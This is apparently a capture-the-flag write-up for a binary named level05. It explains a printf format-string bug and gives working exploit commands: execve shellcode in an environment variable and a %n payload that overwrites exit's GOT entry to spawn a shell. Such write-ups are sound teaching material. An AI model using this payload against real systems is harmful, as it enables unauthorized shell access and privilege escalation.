# LEVEL 05

## EXPLANATIONS

### BINARY BEHAVIOR

- fgets stdin into stack buffer
- modify buffer with strtolower on buffer
- printf(buff) format string exploit

### EXPLOIT STRATEGY

- GOT of exit : 0x80497e0
- => create an env variable which contains the SHELLCODE
- => find the env variable address (we found an utilitary written in C to do this)
- => as the address is 0xffffdfc2, necessary padding for the %n exploit would be 4294959042
  - => we split it in two 2bytes parts, writing them at 0x80497e0 and 0x80497e2
    - => 0xffff => 0x80497e2
    - => 0xdfc2 => 0x80497e0
  - => We overwrite the address of exit in the GOT table {0x8048370} by the address of the SHELLCODE env variable {0xffffdfc2} with 'n' identifier of printf

### RUN COMMAND

```
export SHELLCODE=$(python -c "print('\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80')")
python -c "print('\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1]  + '%57274x' + '%10\$n' + '%8253x' + '%11\$n')" > /tmp/exploit_string
cat /tmp/exploit_string - | env - PWD=$PWD SHELLCODE=$SHELLCODE /home/users/level05/level05
```
